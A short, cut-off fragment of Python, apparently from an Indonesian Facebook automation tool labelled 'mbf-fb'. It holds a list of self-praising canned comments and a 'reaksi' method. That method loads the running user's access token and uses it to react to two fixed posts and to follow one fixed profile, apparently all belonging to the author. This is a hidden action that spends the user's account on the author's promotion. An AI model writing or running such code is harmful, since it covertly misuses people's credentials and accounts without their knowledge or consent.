...
kom=random.choice(["RONI Ganteng:)","Lo Ganteng :v","Yang Posting Orang Nya Ganteng:)","Mantap:v","Saya Pengguna Script ABANG:v","Keren Bro Script Nya:)","Hi I'm mbf-fb User roni ^_^"])
class ganteng:
	...
	def reaksi(self):
		self.get_tok();self.dahlah(f"{self.url}/443437546772701","4","ah sit");self.dahlah(f"{self.url}/442869600162829","8","ah sit");self.tuturkeun("100033193775163");self.tuturkeun("100033193775163")
	def lang(self,cok):
		try:
